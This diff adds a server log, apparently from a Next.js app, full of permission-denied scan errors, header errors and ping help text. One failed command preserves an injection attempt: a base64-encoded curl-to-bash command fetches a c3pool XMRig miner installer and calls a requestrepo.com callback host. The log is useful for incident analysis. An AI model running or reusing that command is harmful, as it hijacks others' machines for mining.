@@ -1,0 +1,188 @@
+2025-12-08 08:31 +00:00: Error scanning directory /run/systemd/propagate/systemd-logind.service: EACCES: permission denied, scandir '/run/systemd/propagate/systemd-logind.service'
+2025-12-08 08:31 +00:00: Error scanning directory /run/systemd/propagate/systemd-networkd.service: EACCES: permission denied, scandir '/run/systemd/propagate/systemd-networkd.service'
+2025-12-08 08:31 +00:00: Error scanning directory /run/systemd/propagate/systemd-resolved.service: EACCES: permission denied, scandir '/run/systemd/propagate/systemd-resolved.service'
+2025-12-08 08:31 +00:00: Error scanning directory /run/systemd/propagate/systemd-timesyncd.service: EACCES: permission denied, scandir '/run/systemd/propagate/systemd-timesyncd.service'
+2025-12-08 08:31 +00:00: Error scanning directory /run/systemd/propagate/systemd-udevd.service: EACCES: permission denied, scandir '/run/systemd/propagate/systemd-udevd.service'
+2025-12-08 08:31 +00:00: Error scanning directory /run/systemd/propagate/upower.service: EACCES: permission denied, scandir '/run/systemd/propagate/upower.service'
+2025-12-08 08:31 +00:00: Error scanning directory /run/udisks2: EACCES: permission denied, scandir '/run/udisks2'
+2025-12-08 08:31 +00:00: Error scanning directory /run/user/1000/systemd/inaccessible/dir: EACCES: permission denied, scandir '/run/user/1000/systemd/inaccessible/dir'
+2025-12-08 08:31 +00:00: Error scanning directory /sys/fs/bpf: EACCES: permission denied, scandir '/sys/fs/bpf'
+2025-12-08 08:31 +00:00: Error scanning directory /sys/fs/pstore: EACCES: permission denied, scandir '/sys/fs/pstore'
+2025-12-08 08:31 +00:00: Error scanning directory /sys/kernel/debug: EACCES: permission denied, scandir '/sys/kernel/debug'
+2025-12-08 08:31 +00:00: Error scanning directory /sys/kernel/tracing: EACCES: permission denied, scandir '/sys/kernel/tracing'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/snap-private-tmp: EACCES: permission denied, scandir '/tmp/snap-private-tmp'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-ModemManager.service-F16cnh: EACCES: permission denied, scandir '/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-ModemManager.service-F16cnh'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-fwupd.service-HzvYNM: EACCES: permission denied, scandir '/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-fwupd.service-HzvYNM'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-polkit.service-3dslvv: EACCES: permission denied, scandir '/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-polkit.service-3dslvv'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-logind.service-IqXOvs: EACCES: permission denied, scandir '/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-logind.service-IqXOvs'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-resolved.service-EmfTpJ: EACCES: permission denied, scandir '/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-resolved.service-EmfTpJ'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-timesyncd.service-wWYR6Y: EACCES: permission denied, scandir '/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-timesyncd.service-wWYR6Y'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-upower.service-5eOmM0: EACCES: permission denied, scandir '/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-upower.service-5eOmM0'
+2025-12-08 08:31 +00:00: Error scanning directory /tmp/vmware-root_749-4282236466: EACCES: permission denied, scandir '/tmp/vmware-root_749-4282236466'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/apt/lists/partial: EACCES: permission denied, scandir '/var/lib/apt/lists/partial'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/fwupd/gnupg: EACCES: permission denied, scandir '/var/lib/fwupd/gnupg'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/polkit-1: EACCES: permission denied, scandir '/var/lib/polkit-1'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/private: EACCES: permission denied, scandir '/var/lib/private'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/snapd/cookie: EACCES: permission denied, scandir '/var/lib/snapd/cookie'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/snapd/void: EACCES: permission denied, scandir '/var/lib/snapd/void'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/partial: EACCES: permission denied, scandir '/var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/partial'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/udisks2: EACCES: permission denied, scandir '/var/lib/udisks2'
+2025-12-08 08:31 +00:00: Error scanning directory /var/lib/update-notifier/package-data-downloads/partial: EACCES: permission denied, scandir '/var/lib/update-notifier/package-data-downloads/partial'
+2025-12-08 08:31 +00:00: Error scanning directory /var/log/private: EACCES: permission denied, scandir '/var/log/private'
+2025-12-08 08:31 +00:00: Error scanning directory /var/spool/cron/crontabs: EACCES: permission denied, scandir '/var/spool/cron/crontabs'
+2025-12-08 08:31 +00:00: Error scanning directory /var/spool/rsyslog: EACCES: permission denied, scandir '/var/spool/rsyslog'
+2025-12-08 08:31 +00:00: Error scanning directory /var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-ModemManager.service-kXlwXX: EACCES: permission denied, scandir '/var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-ModemManager.service-kXlwXX'
+2025-12-08 08:31 +00:00: Error scanning directory /var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-fwupd.service-EmvJ0W: EACCES: permission denied, scandir '/var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-fwupd.service-EmvJ0W'
+2025-12-08 08:31 +00:00: Error scanning directory /var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-polkit.service-OqXv66: EACCES: permission denied, scandir '/var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-polkit.service-OqXv66'
+2025-12-08 08:31 +00:00: Error scanning directory /var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-logind.service-nLL60p: EACCES: permission denied, scandir '/var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-logind.service-nLL60p'
+2025-12-08 08:31 +00:00: Error scanning directory /var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-resolved.service-isPJYn: EACCES: permission denied, scandir '/var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-resolved.service-isPJYn'
+2025-12-08 08:31 +00:00: Error scanning directory /var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-timesyncd.service-a6RAJb: EACCES: permission denied, scandir '/var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-systemd-timesyncd.service-a6RAJb'
+2025-12-08 08:31 +00:00: Error scanning directory /var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-upower.service-mFIKK7: EACCES: permission denied, scandir '/var/tmp/systemd-private-53888e2dbc074d88b8db5d0b32456b89-upower.service-mFIKK7'
+2025-12-08 08:31 +00:00:  ⨯ TypeError: Invalid character in header content ["x-action-redirect"]
+2025-12-08 08:31 +00:00:     at i.setHeader (.next/server/chunks/586.js:22:6902)
+2025-12-08 08:31 +00:00:     at async m (.next/server/app/page.js:1:7354)
+2025-12-08 08:31 +00:00:     at async p (.next/server/app/page.js:2:1860) {
+2025-12-08 08:31 +00:00:   code: 'ERR_INVALID_CHAR'
+2025-12-08 08:31 +00:00: }
+2025-12-08 08:31 +00:00:  ⨯ TypeError: Invalid character in header content ["x-action-redirect"]
+2025-12-08 08:31 +00:00:     at i.setHeader (.next/server/chunks/586.js:22:6902)
+2025-12-08 08:31 +00:00:     at async m (.next/server/app/page.js:1:7354)
+2025-12-08 08:31 +00:00:     at async p (.next/server/app/page.js:2:1860) {
+2025-12-08 08:31 +00:00:   code: 'ERR_INVALID_CHAR'
+2025-12-08 08:31 +00:00: }
+2025-12-08 08:49 +00:00: #=#=#                                                                          
+##O#-#                                                                         
+
+                                                                           1.0%
+###                                                                        4.4%
+#########                                                                 13.2%
+####################                                                      27.8%
+###############################################################           87.8%
+######################################################################## 100.0%
+2025-12-08 08:49 +00:00: tail: cannot open '/etc/rc.local' for reading: No such file or directory
+2025-12-08 08:49 +00:00: ping: invalid option -- 'y'
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: Usage
+2025-12-08 08:49 +00:00:   ping [options] <destination>
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: Options:
+2025-12-08 08:49 +00:00:   <destination>      DNS name or IP address
+2025-12-08 08:49 +00:00:   -a                 use audible ping
+2025-12-08 08:49 +00:00:   -A                 use adaptive ping
+2025-12-08 08:49 +00:00:   -B                 sticky source address
+2025-12-08 08:49 +00:00:   -c <count>         stop after <count> replies
+2025-12-08 08:49 +00:00:   -C                 call connect() syscall on socket creation
+2025-12-08 08:49 +00:00:   -D                 print timestamps
+2025-12-08 08:49 +00:00:   -d                 use SO_DEBUG socket option
+2025-12-08 08:49 +00:00:   -e <identifier>    define identifier for ping session, default is random for
+2025-12-08 08:49 +00:00:                      SOCK_RAW and kernel defined for SOCK_DGRAM
+2025-12-08 08:49 +00:00:                      Imply using SOCK_RAW (for IPv4 only for identifier 0)
+2025-12-08 08:49 +00:00:   -f                 flood ping
+2025-12-08 08:49 +00:00:   -h                 print help and exit
+2025-12-08 08:49 +00:00:   -H                 force reverse DNS name resolution (useful for numeric
+2025-12-08 08:49 +00:00:                      destinations or for -f), override -n
+2025-12-08 08:49 +00:00:   -I <interface>     either interface name or address
+2025-12-08 08:49 +00:00:   -i <interval>      seconds between sending each packet
+2025-12-08 08:49 +00:00:   -L                 suppress loopback of multicast packets
+2025-12-08 08:49 +00:00:   -l <preload>       send <preload> number of packages while waiting replies
+2025-12-08 08:49 +00:00:   -m <mark>          tag the packets going out
+2025-12-08 08:49 +00:00:   -M <pmtud opt>     define path MTU discovery, can be one of <do|dont|want|probe>
+2025-12-08 08:49 +00:00:   -n                 no reverse DNS name resolution, override -H
+2025-12-08 08:49 +00:00:   -O                 report outstanding replies
+2025-12-08 08:49 +00:00:   -p <pattern>       contents of padding byte
+2025-12-08 08:49 +00:00:   -q                 quiet output
+2025-12-08 08:49 +00:00:   -Q <tclass>        use quality of service <tclass> bits
+2025-12-08 08:49 +00:00:   -s <size>          use <size> as number of data bytes to be sent
+2025-12-08 08:49 +00:00:   -S <size>          use <size> as SO_SNDBUF socket option value
+2025-12-08 08:49 +00:00:   -t <ttl>           define time to live
+2025-12-08 08:49 +00:00:   -U                 print user-to-user latency
+2025-12-08 08:49 +00:00:   -v                 verbose output
+2025-12-08 08:49 +00:00:   -V                 print version and exit
+2025-12-08 08:49 +00:00:   -w <deadline>      reply wait <deadline> in seconds
+2025-12-08 08:49 +00:00:   -W <timeout>       time to wait for response
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: IPv4 options:
+2025-12-08 08:49 +00:00:   -4                 use IPv4
+2025-12-08 08:49 +00:00:   -b                 allow pinging broadcast
+2025-12-08 08:49 +00:00:   -R                 record route
+2025-12-08 08:49 +00:00:   -T <timestamp>     define timestamp, can be one of <tsonly|tsandaddr|tsprespec>
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: IPv6 options:
+2025-12-08 08:49 +00:00:   -6                 use IPv6
+2025-12-08 08:49 +00:00:   -F <flowlabel>     define flow label, default is random
+2025-12-08 08:49 +00:00:   -N <nodeinfo opt>  use IPv6 node info query, try <help> as argument
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: For more details see ping(8).
+2025-12-08 08:49 +00:00:  ⨯ [Error: Command failed: ping -c 2 echo Y3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA4NVJoZHdHeU1SWWlaMmYxdjk2YzRVU0hTQmtURHlHNk5jZGVFOW1TYkVybmJ0Z2N0RVVldzNlS2FZenpqRXR6VkI1V0d1dlBIV3lWUFNCQ215ZVhmTGNXRUhSd2JYbg== | base64 -d | bash.0ql6uqw4.requestrepo.com
+2025-12-08 08:49 +00:00: #=#=#                                                                          
+##O#-#                                                                         
+
+                                                                           1.0%
+###                                                                        4.4%
+#########                                                                 13.2%
+####################                                                      27.8%
+###############################################################           87.8%
+######################################################################## 100.0%
+2025-12-08 08:49 +00:00: tail: cannot open '/etc/rc.local' for reading: No such file or directory
+2025-12-08 08:49 +00:00: ping: invalid option -- 'y'
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: Usage
+2025-12-08 08:49 +00:00:   ping [options] <destination>
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: Options:
+2025-12-08 08:49 +00:00:   <destination>      DNS name or IP address
+2025-12-08 08:49 +00:00:   -a                 use audible ping
+2025-12-08 08:49 +00:00:   -A                 use adaptive ping
+2025-12-08 08:49 +00:00:   -B                 sticky source address
+2025-12-08 08:49 +00:00:   -c <count>         stop after <count> replies
+2025-12-08 08:49 +00:00:   -C                 call connect() syscall on socket creation
+2025-12-08 08:49 +00:00:   -D                 print timestamps
+2025-12-08 08:49 +00:00:   -d                 use SO_DEBUG socket option
+2025-12-08 08:49 +00:00:   -e <identifier>    define identifier for ping session, default is random for
+2025-12-08 08:49 +00:00:                      SOCK_RAW and kernel defined for SOCK_DGRAM
+2025-12-08 08:49 +00:00:                      Imply using SOCK_RAW (for IPv4 only for identifier 0)
+2025-12-08 08:49 +00:00:   -f                 flood ping
+2025-12-08 08:49 +00:00:   -h                 print help and exit
+2025-12-08 08:49 +00:00:   -H                 force reverse DNS name resolution (useful for numeric
+2025-12-08 08:49 +00:00:                      destinations or for -f), override -n
+2025-12-08 08:49 +00:00:   -I <interface>     either interface name or address
+2025-12-08 08:49 +00:00:   -i <interval>      seconds between sending each packet
+2025-12-08 08:49 +00:00:   -L                 suppress loopback of multicast packets
+2025-12-08 08:49 +00:00:   -l <preload>       send <preload> number of packages while waiting replies
+2025-12-08 08:49 +00:00:   -m <mark>          tag the packets going out
+2025-12-08 08:49 +00:00:   -M <pmtud opt>     define path MTU discovery, can be one of <do|dont|want|probe>
+2025-12-08 08:49 +00:00:   -n                 no reverse DNS name resolution, override -H
+2025-12-08 08:49 +00:00:   -O                 report outstanding replies
+2025-12-08 08:49 +00:00:   -p <pattern>       contents of padding byte
+2025-12-08 08:49 +00:00:   -q                 quiet output
+2025-12-08 08:49 +00:00:   -Q <tclass>        use quality of service <tclass> bits
+2025-12-08 08:49 +00:00:   -s <size>          use <size> as number of data bytes to be sent
+2025-12-08 08:49 +00:00:   -S <size>          use <size> as SO_SNDBUF socket option value
+2025-12-08 08:49 +00:00:   -t <ttl>           define time to live
+2025-12-08 08:49 +00:00:   -U                 print user-to-user latency
+2025-12-08 08:49 +00:00:   -v                 verbose output
+2025-12-08 08:49 +00:00:   -V                 print version and exit
+2025-12-08 08:49 +00:00:   -w <deadline>      reply wait <deadline> in seconds
+2025-12-08 08:49 +00:00:   -W <timeout>       time to wait for response
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: IPv4 options:
+2025-12-08 08:49 +00:00:   -4                 use IPv4
+2025-12-08 08:49 +00:00:   -b                 allow pinging broadcast
+2025-12-08 08:49 +00:00:   -R                 record route
+2025-12-08 08:49 +00:00:   -T <timestamp>     define timestamp, can be one of <tsonly|tsandaddr|tsprespec>
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: IPv6 options:
+2025-12-08 08:49 +00:00:   -6                 use IPv6
+2025-12-08 08:49 +00:00:   -F <flowlabel>     define flow label, default is random
+2025-12-08 08:49 +00:00:   -N <nodeinfo opt>  use IPv6 node info query, try <help> as argument
+2025-12-08 08:49 +00:00: 
+2025-12-08 08:49 +00:00: For more details see ping(8).
+2025-12-08 08:49 +00:00: ] {
+2025-12-08 08:49 +00:00:   status: 2,
+2025-12-08 08:49 +00:00:   signal: null,
+2025-12-08 08:49 +00:00:   output: [Array],
+2025-12-08 08:49 +00:00:   pid: 3308,
+2025-12-08 08:49 +00:00:   stdout: <Buffer >,
+2025-12-08 08:49 +00:00:   stderr: <Buffer 23 3d 23 3d 23 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 ... 2966 more bytes>,
+2025-12-08 08:49 +00:00:   digest: '448520863'
+2025-12-08 08:49 +00:00: }
